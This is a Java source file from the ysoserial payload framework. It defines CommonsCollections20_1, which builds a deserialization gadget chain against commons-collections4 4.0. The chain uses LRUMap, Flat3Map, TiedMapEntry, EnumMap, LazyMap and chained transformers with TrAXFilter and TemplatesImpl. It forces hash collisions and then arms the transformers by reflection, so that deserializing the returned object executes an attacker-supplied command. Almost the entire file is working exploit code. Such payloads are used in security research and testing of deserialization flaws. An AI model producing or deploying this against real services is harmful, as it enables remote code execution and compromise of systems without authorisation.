package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.Flat3Map;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.map.LRUMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.EnumMap;
import java.util.HashMap;
import java.util.Map;

// Cluster 2: chain_LRUMap4-readObject-13598b6bcf15c7711944a24a8c412e6c2a12482a.txt
/*
    Cluster2_20220605-162453, first chain.
	Gadget chain:

        <org.apache.commons.collections4.map.LRUMap: void readObject(java.io.ObjectInputStream)>
        <org.apache.commons.collections4.map.LRUMap: void doReadObject(java.io.ObjectInputStream)>
        <org.apache.commons.collections4.map.AbstractHashedMap: void doReadObject(java.io.ObjectInputStream)>
        <org.apache.commons.collections4.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
        <org.apache.commons.collections4.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
        <org.apache.commons.collections4.map.Flat3Map: boolean equals(java.lang.Object)>
        <org.apache.commons.collections4.keyvalue.TiedMapEntry: boolean equals(java.lang.Object)>
        <java.util.EnumMap: boolean equals(java.lang.Object)>
        <org.apache.commons.collections4.map.LazyMap: java.lang.Object get(java.lang.Object)>
        <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
        <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>

 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ "BadagliaccaDaniele" })
public class CommonsCollections20_1 extends PayloadRunner implements ObjectPayload<LRUMap> {
    enum TryEnum {
        zZ,
        yy
    }

    public LRUMap<Object, Object> getObject(final String command) throws Exception {

        Object templates = Gadgets.createTemplatesImpl(command);

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[]{String.class};
        Object[] args = new Object[]{"foo"};
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{constant, instantiate});

        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.lazyMap(innerMap1, chain);
        lazyMap1.put("yy", 1);
        System.out.println(lazyMap1.hashCode());
        EnumMap enumMap1 = new EnumMap(TryEnum.class);
        enumMap1.put(TryEnum.yy, lazyMap1);
        System.out.println(enumMap1.hashCode());
        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(enumMap1, enumMap1);
        System.out.println("TiedMap1: " + tiedMapEntry1.hashCode());
        Flat3Map flat3Map1 = new Flat3Map();
        flat3Map1.put(tiedMapEntry1, 2);
        //flat3Map1.put(enumMap1, 2);
        System.out.println(flat3Map1.hashCode());

        Map lazyMap2 = LazyMap.lazyMap(innerMap2, chain);
        lazyMap2.put("zZ", 1);
        System.out.println(lazyMap2.hashCode());
        EnumMap enumMap2 = new EnumMap(TryEnum.class);
        enumMap2.put(TryEnum.yy, lazyMap2);
        System.out.println(enumMap2.hashCode());
        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(enumMap2, enumMap2);
        System.out.println("TiedMap2: " + tiedMapEntry2.hashCode());
        Flat3Map flat3Map2 = new Flat3Map();
        flat3Map2.put(tiedMapEntry2, 2);
        //flat3Map2.put(enumMap2, 2);
        System.out.println(flat3Map2.hashCode());


        LRUMap lruMap = new LRUMap();
        lruMap.put(flat3Map2, 1);
        lruMap.put(flat3Map1, 2);

        // Needed to ensure hash collision after previous manipulations
        lazyMap1.remove("zZ");

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        System.out.println(lazyMap1.hashCode());
        System.out.println(lazyMap2.hashCode());

        return lruMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections20_1.class, args);
    }

}